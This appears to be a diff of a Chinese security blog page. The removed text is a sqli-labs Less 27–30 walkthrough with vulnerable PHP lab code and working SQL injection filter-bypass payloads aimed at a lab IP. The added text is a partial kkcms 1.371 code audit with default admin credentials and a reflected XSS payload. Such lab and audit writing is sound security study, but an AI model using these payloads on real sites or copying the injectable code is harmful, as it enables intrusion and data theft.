@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>sqli-labs Less 27 -&gt; sqli-labs Less 30 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="sqli-labs Less 27 -&gt; sqli-labs Less 30 | 九世的博客">
+  <title>kkcms1.371代码审计 | 九世的博客</title>
+  <meta name="keywords" content=" 代码审计 ">
+  <meta name="description" content="kkcms1.371代码审计 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1679,9 +1679,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-sqli-labs-Less-27-sqli-labs-Less-30" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-kkcms1-371代码审计" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">sqli-labs Less 27 -&gt; sqli-labs Less 30</h1>
+        <h1 class="article-title">kkcms1.371代码审计</h1>
     
     <div class="article-meta">
         
@@ -1690,14 +1690,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">代码审计</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-01-28 20:09</time>
+        创建时间:<time class="date" title="更新时间: 2021-03-31 01:55:08">2021-03-31 00:49</time>
         
     </div>
     <div class="article-meta">
@@ -1719,7 +1719,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#预处理分析"><span class="toc-text">预处理分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#大概分析"><span class="toc-text">大概分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xss"><span class="toc-text">xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie爆破后台绕过验证码"><span class="toc-text">cookie爆破后台绕过验证码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#任意文件读取"><span class="toc-text">任意文件读取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-text">小结</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1734,543 +1734,52 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天从sqli-labs第27关撸到了30关，emmm。还真多<br><img src="https://m.chinawbk.com/images/hk/Webh_C_ykHFh_C_yF4SjUjebh_C_ybVH8_P_94Obxpg1fMg4buDb1xuMKObU4bODKOfx1h_C_yGWxJ.jpg" alt="Webh_C_ykHFh_C_yF4SjUjebh_C_ybVH8_P_94Obxpg1fMg4buDb1xuMKObU4bODKOfx1h_C_yGWxJ.jpg"></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先先看代码：<br>27关代码</p>
-<pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;Less-27 Trick with SELECT &amp; UNION&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-
-
-&lt;?php
-//including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
-
-// take the variables 
-if(isset($_GET[&#39;id&#39;]))
-{
-    $id=$_GET[&#39;id&#39;];
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
-    fclose($fp);
-
-    //fiddling with comments
-    $id= blacklist($id);
-    //echo &quot;&lt;br&gt;&quot;;
-    //echo $id;
-    //echo &quot;&lt;br&gt;&quot;;
-    $hint=$id;
-
-// connectivity 
-    $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
-    $result=mysql_query($sql);
-    $row = mysql_fetch_array($result);
-    if($row)
-    {
-          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;    
-          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-          echo &quot;&lt;br&gt;&quot;;
-          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-          echo &quot;&lt;/font&gt;&quot;;
-      }
-    else 
-    {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        print_r(mysql_error());
-        echo &quot;&lt;/font&gt;&quot;;  
+        <p>看微信公众号有个审计这个CMS的文章。跟着复现了一下，大体来说这个CMS还是比较安全的<br>but，部分功能写法完全不统一。写sql查询的时候有些用了PDO，有些直接带入查询</p>
+<h2 id="预处理分析"><a href="#预处理分析" class="headerlink" title="预处理分析"></a>预处理分析</h2><p>除了编辑器以外的php都会引用system/inc.php或者system/library.php</p>
+<ul>
+<li>library.php 处理函数和单双引号转义处理</li>
+<li>inc.php 引用了system目录里的所有文件</li>
+</ul>
+<h2 id="大概分析"><a href="#大概分析" class="headerlink" title="大概分析"></a>大概分析</h2><p>首先是install/index2.php。写入数据库和生成install.lock文件的处理<br><img src="https://z3.ax1x.com/2021/03/31/cFIVqP.png" alt=""></p>
+<p>首先加载了/system/library.php<br><img src="https://z3.ax1x.com/2021/03/31/cFIlxs.png" alt=""></p>
+<p>可以看到，对所有的请求对单双引号进行了转义</p>
+<pre><code class="php">if (!defined(&#39;PCFINAL&#39;)) {
+    exit(&#39;Request Error!&#39;);
+}
+if (!get_magic_quotes_gpc()) {
+    if (!empty($_GET)) {
+        $_GET = addslashes_deep($_GET);
     }
-}
-    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
-
-
-
-
-function blacklist($id)
-{
-$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*
-$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --.
-$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #.
-$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.
-$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);        //Strip out spaces.
-$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.
-$id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id);        //Strip out union
-$id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id);        //Strip out select
-$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id);        //Strip out UNION
-$id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id);        //Strip out SELECT
-$id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id);        //Strip out Union
-$id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id);        //Strip out select
-return $id;
-}
-
-
-
-?&gt;
-&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
-&lt;img src=&quot;../images/Less-27.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;img src=&quot;../images/Less-27-1.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;
-&lt;?php
-echo &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;
-?&gt;
-&lt;/font&gt; 
-&lt;/center&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p>union和select都过滤掉了，这里有两个办法可以绕过</p>
-<pre><code>1.双写被过滤的
-2.用/**/切割关键字，由于/**/会被匹配到然后替换为空
-
-1 payload :ununionion%a0seselectlect
-2 payload:un/**/ion/**/se/**/lect
-</code></pre><p><a href="http://35.201.152.114:8000/Less-27/?id=1%27%a0and%a0updatexml(1,concat(0x7e,(sel/**/ect%a0user(" target="_blank" rel="noopener">Less-27 Trick with SELECT &amp; UNION</a>),0x7e),1)|%271)</p>
-<p><img src="https://s2.ax1x.com/2019/01/28/kMa05d.png" alt="kMa05d.png"></p>
-<p>第27a,代码如下：</p>
-<pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;Less-27 Trick with SELECT &amp; UNION&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-
-
-&lt;?php
-//including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
-
-// take the variables 
-if(isset($_GET[&#39;id&#39;]))
-{
-    $id=$_GET[&#39;id&#39;];
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
-    fclose($fp);
-
-    //fiddling with comments
-    $id= blacklist($id);
-    //echo &quot;&lt;br&gt;&quot;;
-    //echo $id;
-    //echo &quot;&lt;br&gt;&quot;;
-    $hint=$id;
-    $id = &#39;&quot;&#39; .$id. &#39;&quot;&#39;;
-
-// connectivity 
-    $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
-    $result=mysql_query($sql);
-    $row = mysql_fetch_array($result);
-    if($row)
-    {
-          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;    
-          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-          echo &quot;&lt;br&gt;&quot;;
-          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-          echo &quot;&lt;/font&gt;&quot;;
-      }
-    else 
-    {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        //print_r(mysql_error());
-        echo &quot;&lt;/font&gt;&quot;;  
+    if (!empty($_POST)) {
+        $_POST = addslashes_deep($_POST);
     }
+    $_COOKIE = addslashes_deep($_COOKIE);
+    $_REQUEST = addslashes_deep($_REQUEST);
 }
-    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
-
-
-
-
-function blacklist($id)
-{
-$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*
-$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --.
-$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #.
-$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.
-$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);        //Strip out spaces.
-$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.
-$id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id);        //Strip out union
-$id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id);        //Strip out select
-$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id);        //Strip out UNION
-$id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id);        //Strip out SELECT
-$id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id);        //Strip out Union
-$id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id);        //Strip out Select
-return $id;
-}
-
-
-
-?&gt;
-&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
-&lt;img src=&quot;../images/Less-27a.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;img src=&quot;../images/Less-27a-1.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;
-&lt;?php
-echo &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;
-?&gt;
-&lt;/font&gt; 
-&lt;/center&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p>这关和27关一样，只不过把报错输出注释了，用盲注吧</p>
-<pre><code>http://35.201.152.114:8000/Less-27a/?id=1%22%a0and%a0sleep(if((length(database())=8),1,4))|%221
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/28/kMdCM6.md.png" alt="kMdCM6.md.png"></p>
-<p>第28关代码如下：</p>
-<pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;Less-28 Trick with SELECT &amp; UNION&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-
-
-&lt;?php
-//including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
-
-// take the variables 
-if(isset($_GET[&#39;id&#39;]))
-{
-    $id=$_GET[&#39;id&#39;];
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
-    fclose($fp);
-
-    //fiddling with comments
-    $id= blacklist($id);
-    //echo &quot;&lt;br&gt;&quot;;
-    //echo $id;
-    //echo &quot;&lt;br&gt;&quot;;
-    $hint=$id;
-
-// connectivity 
-    $sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;
-    $result=mysql_query($sql);
-    $row = mysql_fetch_array($result);
-    if($row)
-    {
-          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;    
-          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-          echo &quot;&lt;br&gt;&quot;;
-          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-          echo &quot;&lt;/font&gt;&quot;;
-      }
-    else 
-    {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        //print_r(mysql_error());
-        echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
-    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
-
-
-
-
-function blacklist($id)
-{
-$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);                //strip out /*
-$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);                //Strip out --.
-$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);                    //Strip out #.
-$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);                //Strip out spaces.
-//$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);                    //Strip out spaces.
-$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);                //Strip out spaces.
-$id= preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);        //Strip out UNION &amp; SELECT.
-return $id;
-}
-
-
-
-?&gt;
-&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
-&lt;img src=&quot;../images/Less-28.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;img src=&quot;../images/Less-28-1.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;
-&lt;?php
-echo &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;
-?&gt;
-&lt;/font&gt; 
-&lt;/center&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p>这个好像是匹配union+select，就是union到select这个地方，绕过方式也一样用 /**/代替</p>
-<pre><code>http://35.201.152.114:8000/Less-28/?id=0%27)%a0un/**/ion%a0sel/**/ect%a01,user(),3|(%271
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/28/kMddyV.png" alt="kMddyV.png"></p>
-<p>第28a关代码如下：</p>
-<pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;Less-28a Trick with SELECT &amp; UNION&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-
-
-&lt;?php
-//including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
-
-// take the variables 
-if(isset($_GET[&#39;id&#39;]))
-{
-    $id=$_GET[&#39;id&#39;];
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
-    fclose($fp);
-
-    //fiddling with comments
-    $id= blacklist($id);
-    //echo &quot;&lt;br&gt;&quot;;
-    //echo $id;
-    //echo &quot;&lt;br&gt;&quot;;
-    $hint=$id;
-
-// connectivity 
-    $sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;
-    $result=mysql_query($sql);
-    $row = mysql_fetch_array($result);
-    if($row)
-    {
-          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;    
-          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-          echo &quot;&lt;br&gt;&quot;;
-          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-          echo &quot;&lt;/font&gt;&quot;;
-      }
-    else 
-    {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        //print_r(mysql_error());
-        echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
-    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
-
-
-
-
-function blacklist($id)
-{
-//$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);                //strip out /*
-//$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);                //Strip out --.
-//$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);                    //Strip out #.
-//$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);                //Strip out spaces.
-//$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);                    //Strip out spaces.
-//$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);                //Strip out spaces.
-$id= preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);        //Strip out spaces.
-return $id;
-}
-
-
-
-?&gt;
-&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
-&lt;img src=&quot;../images/Less-28a.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;img src=&quot;../images/Less-28a-1.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;
-&lt;?php
-echo &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;
-?&gt;
-&lt;/font&gt; 
-&lt;/center&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p>这里把一些过滤去掉了，也就是说无法用/**/了= =，不过不慌</p>
-<pre><code>他这里只剩下匹配union+select这里的union和select大小写绕过中间的空格用%a0代替
-http://35.201.152.114:8000/Less-28a/?id=0%27)%a0uNion%a0sELECT%a01,database(),3|(%271
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/28/kMwZ0U.png" alt="kMwZ0U.png"></p>
-<p>第29关代码如下：</p>
-<pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;Less-29 Protection with WAF&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-
-
-&lt;?php
-//including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
-//disable error reporting
-error_reporting(0);
-
-// take the variables 
-if(isset($_GET[&#39;id&#39;]))
-{
-    $id=$_GET[&#39;id&#39;];
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
-    fclose($fp);
-
-    $qs = $_SERVER[&#39;QUERY_STRING&#39;];
-    $hint=$qs;
-
-// connectivity 
-    $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
-    $result=mysql_query($sql);
-    $row = mysql_fetch_array($result);
-    if($row)
-    {
-          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;    
-          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-          echo &quot;&lt;br&gt;&quot;;
-          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-          echo &quot;&lt;/font&gt;&quot;;
-      }
-    else 
-    {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        print_r(mysql_error());
-        echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
-    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
-
-
-
-
-
-
-
-?&gt;
-&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
-&lt;img src=&quot;../images/Less-29.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;img src=&quot;../images/Less-29-1.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;
-&lt;?php
-echo &quot;Hint: The Query String you input is: &quot;.$hint;
-?&gt;
-&lt;/font&gt; 
-&lt;/center&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p>这关我搞不明白为什么没过滤= =。。。，直接带走</p>
-<pre><code>http://35.201.152.114:8000/Less-29/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)|%271
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/28/kM0VgI.md.png" alt="kM0VgI.md.png"></p>
-<p>30关代码如下：</p>
-<pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;Less-30&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-
-
-&lt;?php
-//including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
-
-//disable error reporting
-error_reporting(0);
-
-// take the variables 
-if(isset($_GET[&#39;id&#39;]))
-{
-    $id=$_GET[&#39;id&#39;];
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
-    fclose($fp);
-
-    $qs = $_SERVER[&#39;QUERY_STRING&#39;];
-    $hint=$qs;
-    $id = &#39;&quot;&#39; .$id. &#39;&quot;&#39;;
-
-// connectivity 
-    $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
-    $result=mysql_query($sql);
-    $row = mysql_fetch_array($result);
-    if($row)
-    {
-          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;    
-          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-          echo &quot;&lt;br&gt;&quot;;
-          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-          echo &quot;&lt;/font&gt;&quot;;
-      }
-    else 
-    {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        //print_r(mysql_error());
-        echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
-    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
-
-
-
-?&gt;
-&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
-&lt;img src=&quot;../images/Less-30.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;img src=&quot;../images/Less-30-1.jpg&quot; /&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;
-&lt;?php
-echo &quot;Hint: The Query String you input is: &quot;.$hint;
-?&gt;
-&lt;/font&gt; 
-&lt;/center&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p>也是没过滤。。。。带走</p>
-<pre><code>http://35.201.152.114:8000/Less-30/?id=0%22union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=0x7573657273%20limit%200,1%20--+
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/28/kM0DPJ.md.png" alt="kM0DPJ.md.png"></p>
-<p>转载请声明：转自422926799.github.io</p>
+</code></pre>
+<p>之后index2.php的流程<br>1.判断了install.lock文件是否存在<br>2.将数据库配置信息写入到system/data.php<br>3.往数据库导入sql</p>
+<p>由于过滤了特殊符号，这里单引号没法闭合。无法利用<br>安装完默认后台:admin/123456</p>
+<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>template\wapian\movie.php<br><img src="https://z3.ax1x.com/2021/03/31/cFI0z9.png" alt=""></p>
+<p>getPageHtml函数是用来模板渲染的<br><img src="https://z3.ax1x.com/2021/03/31/cFIDMR.png" alt=""></p>
+<p>看了一下payload主要还是<code>$yourneed</code>参数，跟踪发现来自360.php<br><img src="https://z3.ax1x.com/2021/03/31/cFIgIO.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/03/31/cFIcdK.png" alt=""></p>
+<p>无任何过滤<br>payload:<code>m=&quot;11111111111&quot;&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;&lt;</code><br><img src="https://z3.ax1x.com/2021/03/31/cFIRiD.png" alt=""></p>
